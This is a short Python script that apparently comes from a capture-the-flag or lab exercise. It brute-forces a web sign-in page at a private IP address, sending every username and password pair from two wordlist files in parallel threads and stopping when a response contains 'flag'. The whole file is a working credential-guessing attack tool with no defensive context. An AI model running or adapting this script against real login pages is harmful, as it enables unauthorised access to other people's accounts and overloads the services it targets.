import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

def brute_force_signin(username, password):
    url = f"http://192.168.56.101/?page=signin&username={username}&password={password}&Login=Login"

    response = requests.get(url)
    return response.text, username, password

def main():
    with open("passwords.txt", "r") as file:
        passwords = file.read().splitlines()
    with open("usernames.txt", "r") as file:
        usernames = file.read().splitlines()

    combinations = [(username, password) for username in usernames for password in passwords]

    found_credentials = False
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(brute_force_signin, username, password) for username, password in combinations]

        for future in as_completed(futures):
            response, username, password = future.result()
            print(f"Trying username: {username}, password: {password}")
            if "flag" in response:
                print(f"Success! Username: {username}, Password: {password}")
                print(response)
                found_credentials = True
                break
            else:
                print("Failed")

    # Cancel remaining futures if credentials are found
    # exit()
    if found_credentials:
        for future in futures:
            future.cancel()

if __name__ == "__main__":
    main()
